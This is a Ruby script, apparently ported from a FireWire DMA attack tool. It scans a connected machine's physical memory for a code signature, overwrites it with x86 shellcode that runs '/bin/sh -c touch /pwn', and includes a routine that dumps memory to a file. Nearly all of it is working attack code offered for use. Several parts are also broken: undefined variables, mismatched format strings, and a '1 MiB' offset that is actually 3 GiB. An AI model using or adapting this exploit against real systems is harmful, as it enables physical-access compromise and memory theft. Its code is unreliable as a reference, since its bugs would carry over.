#!/usr/bin/env ruby
require './bus'
require 'pp'

class Patch
    ##
    # Constructor

    def initialize(sig, patch, offset)
        @sig = sig
        @patch = patch
        @offset = offset
    end

    def set_sig(sig)
        @sig = value
    end

    def get_sig
        return @sig
    end
    
    def set_patch(patch)
        @patch = patch
    end

    def get_patch
        return @patch
    end

    def set_offset(offset)
        @offset = offset 
    end
    
    def get_offset
        return @offset
    end
end

def hex2bin(s)
    raise "Not a valid hex string" unless(s =~ /^[\da-fA-F]+$/)
    s = '0' + s if((s.length & 1) != 0)
    return s.scan(/../).map{ |b| b.to_i(16) }.pack('C*')
end

def bin2hex(s)
    return s.unpack('C*').map{ |b| "%02X" % b }.join('')
end
    
def run(context)
    sig = hex2bin("8B430C8B501C895424048B40")
    patch = hex2bin("6a0b58995266682d6389e7682f736800682f62696e89e352e80b000000746f756368202f70776e00575389e1cd80909090909090909090909090909090909090")
    off = 0x4f2
    
    # Print phase, method and patch parameters
    puts '        Using signature: %x' % bin2hex(sig)
    puts '        Using patch:     %x' % patch
    puts '        Using offset:    %x' % off

    # Initialize
    d = initialize_fw(d)
     
    # Find memory size
    puts 'Detecting memory size...'
    memsize = 4 * 1024 * 1024  * 1024
    puts '%d MiB main memory detected' % (Integer(memsize)/(1024 * 1024)) 

    # Attack
    puts 'Starting attack...'
    begin        
    # Find
        addr = findsig(d, sig, off, memsize)
        if !addr
            settings.success = False
        else
            print '+ Signature found at 0x%x.' % addr
            d.write(addr, patch)
            if d.read(addr, sig.length) == patch
                    msg ='Write-back verified; patching successful.'
            else
                    msg ='Write-back could not be verified; patching unsuccessful.'
                    #s._success = False
            end
        end 
    rescue IOError => e
        success = false
        puts '-', 'I/O Error, make sure FireWire interfaces are properly connected.'
        puts e.message
    end

    if !success
        fail('Failed to dump.')
    end 

                    
    if not settings.success
        fail('Signature not found.')
    end
end

def initialize_fw(d)
    b = Bus.new
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()

    begin
        for i in 3.downto(1)
            puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
            STDOUT.flush
            sleep(1)
        end
    rescue 
        puts 'Interrupted'
    end 

    # Open the first device
    d = b.devices
   
    if (d.length > 0)
        d = d[0]
        d.open()
        puts ''
    else
        raise 'nothing connected'
    end

    return d
end 

def findsig(d, sig, off, memsize)
    pagesize = 4096 
    # Skip the first 1 MiB of memory
    one_mb = 3 * 1024 * 1024 * 1024
    
    for addr in (one_mb + off..memsize).step(pagesize)
        data = d.read(addr, sig.length)
        # print "Data found %s at %d \r" % [data.unpack('C*').map{ |b| "%02X" % b }.join(), addr]
        # TODO: Fix ugly compare, should be direct compare of bin data and sig 
        # puts "----"
        # pp data
        # pp sig 
        if (data  == sig)
            return addr
        end
    end
      

#    while addr < memsize:
#        # Prepare a batch of 128 requests
#        r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
#        for caddr, cand  in d.readv(r):
#            if cand == sig:
#                print()
#                return caddr
#        mibaddr = math.floor((addr + one_mb) / (one_mb)) # Account for the first MiB
#        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
#        if ctx.verbose:
#            sys.stdout.write('Addr: {1}  Data read: 0x{0} \n'.format(hexlify(cand).decode(ctx.encoding), hex(caddr)))
#
#        sys.stdout.write('\r')
#        sys.stdout.flush()
#
#        # Append read data to buffer, and check if the all entries in the buffer
#        # is equal. If they are, we're likely not getting data
#        buf.appendleft(cand)
#        if all_equal(buf):
#            print()
#            cont = input('[-] Looks like we\'re not getting any data. We ' \
#                         'could be outside memory\n    boundaries, or simply ' \
#                         'not have DMA. Try using -v/--verbose to debug.\n    '\
#                         'Continue? [Y/n]: ')
#            if cont == 'n':
#                fail()
#            else: # Double the buffer
#                buf = collections.deque(buf.maxlen * 2 * [0], buf.maxlen * 2)
#
#        addr += ctx.PAGESIZE * 128
    print()
    return
end

def loop_memory(d, memsize)
    f = File.open('memdump','w')
    # Skip the first 1 MiB of memory
    startmem = 1 * 1024 * 1024
    endmem = 4 * 1024 * 1024 * 1024

    chunk = 1024

    for addr in (startmem..endmem).step(chunk)
        cdata = d.read(addr, chunk)
        f.syswrite(cdata)
        
        print " Data read: %s x %s \r" % [cdata.to_i(2).to_s(16), addr]
        STDOUT.flush
    end
end

def fail(msg)
    puts "\n [!] Attack unsuccessful."
    puts msg
    exit
end

if __FILE__ == $0
    run( ARGV )
end

